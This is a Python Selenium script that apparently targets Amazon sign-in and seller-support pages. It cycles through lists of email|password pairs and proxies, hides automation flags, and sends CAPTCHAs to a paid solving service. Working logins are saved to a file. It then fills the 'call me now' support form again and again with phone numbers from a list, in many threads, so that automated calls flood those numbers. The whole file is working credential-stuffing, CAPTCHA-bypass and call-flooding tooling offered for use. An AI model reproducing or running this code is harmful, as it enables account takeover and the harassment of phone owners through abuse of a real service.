from telnetlib import EC
import names, os, random, string, phonenumbers, warnings
from captcha_solver import CaptchaSolver
from selenium.webdriver import Keys
clear = lambda: os.system('cls')
clear()
import urllib.request
from glob import iglob
from PIL import Image
from threading import Thread
from colorama import Fore
from selenium import webdriver
from selenium.webdriver.common.by import By
from time import sleep
import random_address
from selenium.webdriver.support.select import Select
from selenium.webdriver.support.wait import WebDriverWait
import phone_iso3166.country as countries

warnings.filterwarnings("ignore", category=DeprecationWarning)
global url1, url2
def readProxy():
    with open('positions/positionVpn.txt', 'r') as e:
        position= e.readline()
        e.close()
    with open('vpn.txt', 'r') as e:
        e.seek(int(position))
        vpn = e.readline()
        if vpn=="" or vpn==" " :
            position=0
        else:
            position = e.tell()
    with open('positions/positionVpn.txt', 'w') as e:
        e.write(str(position))
        e.close()
    return vpn
def get_driver():
    chrome_options = webdriver.ChromeOptions()
    # chrome_options = uc.ChromeOptions()
    proxy=readProxy()
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    print(Fore.RED + 'proxy : ' + Fore.GREEN + proxy)
    # chrome_options.experimental_options["prefs"] = {
    #     "profile.managed_default_content_settings.images": 2,
    #     "profile.managed_default_content_settings.stylesheets": 2,
    #     # "profile.managed_default_content_settings.javascript": 2,
    #     "profile.managed_default_content_settings.geolocation": 2,
    #     "profile.default_content_setting_values.notifications": 2,
    # }
    if headless == 0:
        chrome_options.add_argument("--headless")
    # chrome_options.add_extension('so.crx')
    # chrome_options = uc.ChromeOptions()
    chrome_options.add_argument("--lang=en-US")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--mute-audio")
    chrome_options.add_argument("disable-infobars")
    chrome_options.add_argument("--clear-token-service")
    chrome_options.add_argument('--disable-popup-blocking')
    chrome_options.add_argument("--aggressive-cache-discard")
    chrome_options.add_argument("--disable-cache")
    chrome_options.add_argument("--disable-application-cache")
    chrome_options.add_argument("--disable-offline-load-stale-cache")
    chrome_options.add_argument("--disable-3d-apis")
    chrome_options.add_argument("--disable-gpu-shader-disk-cache")
    chrome_options.add_argument("--media-cache-size=0")
    chrome_options.add_argument("--disk-cache-size=0")
    chrome_options.add_argument("--disable-blink-features=AutomationControlled")
    chrome_options.add_argument('--disable-gpu')
    chrome_options.add_argument('--disable-dev-shm-usage')
    # chrome_options.add_argument('--blink-settings=imagesEnabled=false')
    # chrome_options.add_argument("--user-agent= Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/87.0.4280.77 Mobile/15E148 Safari/604.1")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--incognito")
    chrome_options.add_argument("--window-size=700,700")
    chrome_options.add_argument("--log-level=3")
    chrome_options.add_experimental_option('excludeSwitches', ['enable-logging'])
    chrome_options.add_argument("--silent")
    chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
    chrome_options.add_experimental_option('useAutomationExtension', False)
    driver = webdriver.Chrome('chromedriver.exe', options=chrome_options)
    # driver = uc.Chrome(options=chrome_options)
    driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
    driver.delete_all_cookies()
    return driver
def readEmail():
    with open('positions/positionEmails.txt', 'r') as e:
        position= e.readline()
        e.close()
    with open('Emails.txt', 'r') as e:
        e.seek(int(position))
        EmailData = e.readline()
        if EmailData=="" or EmailData==" " :
            position=0
        else:
            position = e.tell()
    with open('positions/positionEmails.txt', 'w') as e:
        e.write(str(position))
        e.close()
    return EmailData
def readNumber():
    with open('positions/positionNumber.txt', 'r') as e:
        position= e.readline()
        e.close()
    with open('Number.txt', 'r') as e:
        e.seek(int(position))
        EmailData = e.readline()
        if EmailData=="" or EmailData==" " :
            position=0
        else:
            position = e.tell()
    with open('positions/positionNumber.txt', 'w') as e:
        e.write(str(position))
        e.close()
    return EmailData
def readExtention():
    with open('positions/positionExtention.txt', 'r') as e:
        position = e.readline()
        e.close()
    with open('Extention.txt', 'r') as e:
        e.seek(int(position))
        EmailData = e.readline()
        if EmailData == "" or EmailData == " ":
            position = 0
        else:
            position = e.tell()
    with open('positions/positionExtention.txt', 'w') as e:
        e.write(str(position))
        e.close()
    return EmailData
def expand_shadow_element(element, driver):
	shadow_root=driver.execute_script('return arguments[0].shadowRoot', element)
	return shadow_root
def StartLogin(driver, EmailData):
    # try:
        url1 = random.choice(list(open('URL1.txt', 'r').readlines()))
        url2 = random.choice(list(open('URL2.txt', 'r').readlines()))
        Email, Pass = str(EmailData).split('|')
        driver.get(url1)
        # WebDriverWait(driver, 100).until(EC.presence_of_all_elements_located)
        if "Type the characters you see in this image" in driver.page_source:
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(13))
            with open(f"trash/{result_str}.png", "ab") as file:
                f = 0
                while f == 0:
                    try:
                        captcha_img = WebDriverWait(driver, 100).until(
                            lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                        file.write(captcha_img.screenshot_as_png)
                        f = 1
                    except:
                        f = 0
            with open("captcha code.txt", "r") as c:
                cap = c.readline()
                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                raw_data = open(f"trash/{result_str}.png", 'rb').read()
            solving_captcha = solver.solve_captcha(raw_data)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                solving_captcha)
            sleep(0.1)
            WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
            sleep(0.1)
            os.remove(f'trash/{result_str}.png')

        if 'ap_password' in driver.page_source:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)

        else:
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='email')).send_keys(
                Email, Keys.RETURN)
            WebDriverWait(driver, 20).until(lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass, Keys.RETURN)
        sleep(0.3)
        if "auth-warning-message-box" in driver.page_source:
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
            WebDriverWait(driver, 20).until(
                lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                Pass)
            letters = string.ascii_lowercase
            result_str = ''.join(random.choice(letters) for i in range(15))
            srccaptchavalue = WebDriverWait(driver, 100).until(
                lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image")).get_attribute("src")
            if ('.gif' in srccaptchavalue):
                urllib.request.urlretrieve(srccaptchavalue, "trash/%s.gif" % (result_str))
                frame = Image.open(f'trash/{result_str}.gif')
                nframes = 0
                rep = 0
                numoffile = 1
                while frame:
                    if nframes == 0 or nframes == rep + 7 and nframes < 42:
                        frame.save(f'trash/{result_str}-%s.png' % (numoffile), 'PNG')
                        inf = f'trash/{result_str}-%s.png' % (numoffile)
                        im = Image.open(inf)
                        crop_rectangle = (im.width - 40, 0, im.width, im.height)
                        cropped_im = im.crop(crop_rectangle)
                        cropped_im.save('%s' % inf, 'PNG')
                        numoffile += 1
                        rep = nframes
                    nframes += 1
                    try:
                        frame.seek(nframes)
                    except EOFError:
                        break
                ins = 1
                new_im = Image.new('RGB', (40 * 6, 70), (250, 250, 250))
                numoffile = 1
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 2
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 3
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 4
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 5
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                numoffile = 6
                for fn in sorted(iglob(f'trash/{result_str}-%s.png' % (numoffile))):
                    img = Image.open(fn)
                    if ins == 1:
                        new_im.paste(img, (0, 0))
                    if ins == 2:
                        new_im.paste(img, (40, 0))
                    if ins == 3:
                        new_im.paste(img, (40 * 2, 0))
                    if ins == 4:
                        new_im.paste(img, (40 * 3, 0))
                    if ins == 5:
                        new_im.paste(img, (40 * 4, 0))
                    if ins == 6:
                        new_im.paste(img, (40 * 5, 0))
                    ins += 1
                new_im.save(f'trash/{result_str}.jpg', "JPEG", quality=80, optimize=True, progressive=True)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.jpg", 'rb').read()

                solving_captcha = solver.solve_captcha(raw_data)
                # print(solving_captcha+"   11111111111111111111111111111111111")
                # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                #     (By.XPATH, '//*[@id="cvf-page-content"]/div/div/div/form/div[2]/div/input'))).send_keys(
                #     solving_captcha[0:6], Keys.RETURN)
                try:
                    WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                        solving_captcha)
                    sleep(0.1)
                    WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                    # WebDriverWait(driver, 50).until(EC.presence_of_element_located(
                    #     (By.XPATH, '/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/form/div/div/div/div[3]/div[1]/input'))).send_keys(
                    #     solving_captcha[0:6], Keys.RETURN)
                except:
                    print(2222222222222)
                sleep(0.5)
            else:
                letters = string.ascii_lowercase
                result_str = ''.join(random.choice(letters) for i in range(8))
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).clear()
                WebDriverWait(driver, 20).until(
                    lambda driver: driver.find_element(by=By.NAME, value='password')).send_keys(
                    Pass)
                with open(f"trash/{result_str}.png", "ab") as file:
                    captcha_img = WebDriverWait(driver, 100).until(
                        lambda driver: driver.find_element(By.CSS_SELECTOR, "#auth-captcha-image"))
                    file.write(captcha_img.screenshot_as_png)
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.png", 'rb').read()
                solving_captcha = solver.solve_captcha(raw_data)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element("id", "auth-captcha-guess")).send_keys(
                    solving_captcha)
                sleep(0.1)
                WebDriverWait(driver, 100).until(lambda driver: driver.find_element("id", "signInSubmit")).click()
                sleep(0.2)
                os.remove(f'trash/{result_str}.png')
            sleep(0.3)
        if "auth-error-message-box" in driver.page_source or "forgotpassword/reverification?" in driver.current_url:
            print(
                Fore.LIGHTRED_EX + "[!] Invalid Login, Check Your Email or Password or maybe Account Bloced!" + Fore.RESET)
            driver.quit()
        sleep(0.3)
        try:
            driver.find_element(By.XPATH,
                                "/html/body/div[1]/div[1]/div[2]/div/div[2]/div/div/div/form/div/div[5]/div/a").click()
        except:
            pass

            if "Type the characters you see in this image" in driver.page_source:
                letters = string.ascii_lowercase
                result_str = ''.join(random.choice(letters) for i in range(3))
                with open(f"trash/{result_str}.png", "ab") as file:
                    f = 0
                    while f == 0:
                        try:
                            captcha_img = WebDriverWait(driver, 100).until(
                                lambda driver: driver.find_element(By.CSS_SELECTOR, "div.a-row.a-text-center > img"))
                            file.write(captcha_img.screenshot_as_png)
                            f = 1
                        except:
                            f = 0
                with open("captcha code.txt", "r") as c:
                    cap = c.readline()
                    solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                    raw_data = open(f"trash/{result_str}.png", 'rb').read()
                solving_captcha = solver.solve_captcha(raw_data)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element("id", "captchacharacters")).send_keys(
                    solving_captcha)
                sleep(0.1)
                WebDriverWait(driver, 100).until(
                    lambda driver: driver.find_element(By.CSS_SELECTOR, value="span > button")).click()
                sleep(0.1)
                os.remove(f'trash/{result_str}.png')

            if "For your security, approve the notification sent to:" in driver.page_source or "Customise the Amazon Pay experience" in driver.page_source:
                if "Customise the Amazon Pay experience" in driver.page_source:
                    with open('SuccessEmailEurope.txt', 'a') as f:
                        f.write(Email + "|" + Pass)
                driver.quit()
            if 'Select a Merchant and Marketplace'in driver.page_source:
                sleep(0.5)
                while True:
                    try:
                        driver.find_element(By.XPATH,
                                            '//*[@id="picker-container"]/div/div[2]/div/div[3]/div/div[1]/button').click()
                        break
                    except:
                        pass
                sleep(0.3)
                driver.find_element(By.XPATH,
                                    '//*[@id="picker-container"]/div/div[3]/div/button').click()
                sleep(0.2)
                driver.get(url2)
                numofcall = open('numOfCall.txt', 'r').read()
                numofcallForNumber = open('numofcallForNumber.txt', 'r').read()
                for i in range(0, int(numofcall)):
                    if 'Internal failure'in driver.page_source:
                        if 'The captcha you entered was incorrect' in driver.page_source:
                            driver.refresh()
                            pass
                        else:
                            print('failure')
                            break
                    Number = readNumber()
                    for j in range(0, int(numofcallForNumber)):
                        # try:
                            i += 1
                            if 'Internal failure' in driver.page_source:
                                if 'The captcha you entered was incorrect' in driver.page_source:
                                    driver.refresh()
                                    pass
                                break
                            element = WebDriverWait(driver, 20).until(
                                lambda driver:
                                driver.find_element(
                                    by=By.CSS_SELECTOR,
                                    value='#root > div > form > div > div.hill-primary-input-container > div > kat-textarea'))
                            shadow_root1 = expand_shadow_element(element, driver)
                            letters = string.ascii_lowercase

                            for i in range(0, 5):
                                # r = random.randint(5, 12)
                                result_str = ''.join(random.choice(letters) for i in range(13))
                                shadow_root1.find_element(By.ID, value='textarea-2').send_keys(
                                    result_str)
                                shadow_root1.find_element(By.ID, value='textarea-2').send_keys(" ")

                            country = countries.phone_country('+' + Number)
                            countryCode = phonenumbers.country_code_for_region(country)
                            callNum = Number.split(str(countryCode), 1)[1]
                            # print(country)
                            # print(countryCode)
                            # print(callNum)
                            WebDriverWait(driver, 20).until(
                                lambda driver:
                                driver.find_element(
                                    by=By.XPATH,
                                    value='//*[@id="root"]/div/form/div/div[3]/kat-tabs/kat-tab/kat-box/div[2]/div[1]/div/div[2]/span[3]/kat-dropdown')).click()
                            element = WebDriverWait(driver, 20).until(
                                lambda driver:
                                driver.find_element(
                                    by=By.CSS_SELECTOR,
                                    value='#root > div > form > div > div.hill-contact-methods > kat-tabs > kat-tab > kat-box > div.hill-form-fields-container.hill-phone-fields > div.hill-form-fields-container.hill-phone-input > div > div.inputs > span.country-selector > kat-dropdown'))
                            shadow_root1 = expand_shadow_element(element, driver)
                            # try:
                            if countryCode == 1:
                                with open('countryUSA.txt', 'r') as co:
                                    country = co.read()
                            shadow_root1.find_element(By.CSS_SELECTOR, value=f"kat-option[value='{country}']").click()
                            # shadow_root1.find_element(By.CSS_SELECTOR, value=f"kat-option[value='US']").click()

                            element = WebDriverWait(driver, 20).until(
                                lambda driver:
                                driver.find_element(
                                    by=By.CSS_SELECTOR,
                                    value='div.inputs > span.phone-number > span.phone-number-input > div > kat-input'))
                            shadow_root1 = expand_shadow_element(element, driver)
                            shadow_root1.find_element(By.CSS_SELECTOR, value="#input-3").send_keys(callNum)

                            ext = readExtention()
                            if ext == "" or ext == " ":
                                pass
                            else:
                                element = WebDriverWait(driver, 20).until(
                                    lambda driver:
                                    driver.find_element(
                                        by=By.CSS_SELECTOR,
                                        value='span.phone-number-extension > div > kat-input'))
                                shadow_root1 = expand_shadow_element(element, driver)
                                shadow_root1.find_element(By.CSS_SELECTOR, value="#input-4").send_keys(ext)
                                element = WebDriverWait(driver, 20).until(
                                    lambda driver:
                                    driver.find_element(
                                        by=By.CSS_SELECTOR,
                                        value='#katal-id-11'))
                                driver.execute_script("arguments[0].scrollIntoView();", element)
                                driver.execute_script("arguments[0].click();", element)
                            sleep(0.5)
                            letters = string.ascii_lowercase
                            result_str = ''.join(random.choice(letters) for i in range(12))
                            with open(f"trash/{result_str}.png", "ab") as file:
                                f = 0
                                while f == 0:
                                    try:
                                        captcha_img = WebDriverWait(driver, 100).until(
                                            lambda driver: driver.find_element(By.CSS_SELECTOR,
                                                                               "div.captcha-image > img"))
                                        file.write(captcha_img.screenshot_as_png)
                                        f = 1
                                    except:
                                        f = 0
                            with open("captcha code.txt", "r") as c:
                                cap = c.readline()
                                solver = CaptchaSolver('2captcha', api_key=f'{cap}')
                                raw_data = open(f"trash/{result_str}.png", 'rb').read()
                            solving_captcha = solver.solve_captcha(raw_data)

                            element = WebDriverWait(driver, 20).until(
                                lambda driver:
                                driver.find_element(
                                    by=By.CSS_SELECTOR,
                                    value='div.hill-captcha-container > div.captcha-input > div > kat-input'))

                            shadow_root1 = expand_shadow_element(element, driver)

                            shadow_root1.find_element(By.ID, value='input-5').send_keys(
                                solving_captcha)
                            os.remove(f'trash/{result_str}.png')

                            element = WebDriverWait(driver, 20).until(
                                lambda driver:
                                driver.find_element(
                                    by=By.CSS_SELECTOR,
                                    value='#call-me-now-button'))
                            shadow_root1 = expand_shadow_element(element, driver)
                            element = shadow_root1.find_element(By.CSS_SELECTOR, value="button")

                            driver.execute_script("arguments[0].scrollIntoView();", element)
                            driver.execute_script("arguments[0].click();", element)

                            sleep(0.3)
                            # sleep(999)
                            if 'cancel-call-button' in driver.page_source:
                                print(Fore.GREEN + 'Success Call >>> ' + str(callNum))
                                sleep(6)
                            if 'Internal failure' in driver.page_source:
                                if 'The captcha you entered was incorrect' in driver.page_source:
                                    driver.refresh()
                                    pass
                                else:
                                    print('failure')
                                    break
                            driver.refresh()
                            sleep(1)
                        # except:
                        #     pass
                print(Fore.MAGENTA + "End Call" + Fore.RESET)
                driver.quit()
            elif 'Not Authorized' in driver.page_source:
                driver.quit()
                print(22222222)
    # except:
    #     pass

def main():
    while True:
        # try:
            driver = get_driver()
            EmailData = readEmail()
            StartLogin(driver, EmailData)
        # except:
        #     pass


def cls(): os.system('cls' if os.name == 'nt' else 'clear')


def logo():
    cls()
    print(Fore.WHITE + '''

                            ────────────────────────────────────────────────────────────
                            ─██████──████████────████████████████──────██████████████───
                            ─██░░██──██░░░░██────██░░░░░░░░░░░░██──────██░░░░░░░░░░██───
                            ─██░░██──██░░████────██░░████████░░██──────██░░██████░░██───
                            ─██░░██──██░░██──────██░░██────██░░██──────██░░██──██░░██───
                            ─██░░██████░░██──────██░░████████░░██──────██░░██████░░████─
                            ─██░░░░░░░░░░██──────██░░░░░░░░░░░░██──────██░░░░░░░░░░░░██─
                            ─██░░██████░░██──────██░░██████░░████──────██░░████████░░██─
                            ─██░░██──██░░██──────██░░██──██░░██────────██░░██────██░░██─
                            ─██░░██──██░░████────██░░██──██░░██████────██░░████████░░██─
                            ─██░░██──██░░░░██────██░░██──██░░░░░░██────██░░░░░░░░░░░░██─
                            ─██████──████████────██████──██████████────████████████████─
                            ────────────────────────────────────────────────────────────
    \n\n\n''')


if __name__ == '__main__':
    logo()
    # This code won't run if this file is imported.
    print("[+] pleas enter number of threads..")
    number_of_threads = input()
    # print("[+] if you need change language enter >> 1 ")
    # try:
    #     AskLang = int(input())
    # except:
    #     AskLang = 0
    print("[+] to non headless enter >> 1 ")
    try:
        headless = int(input())
    except:
        headless = 0


    def func():
        main()


    for number in range(int(number_of_threads)):
        t = Thread(target=func)
        t.start()
        sleep(1)

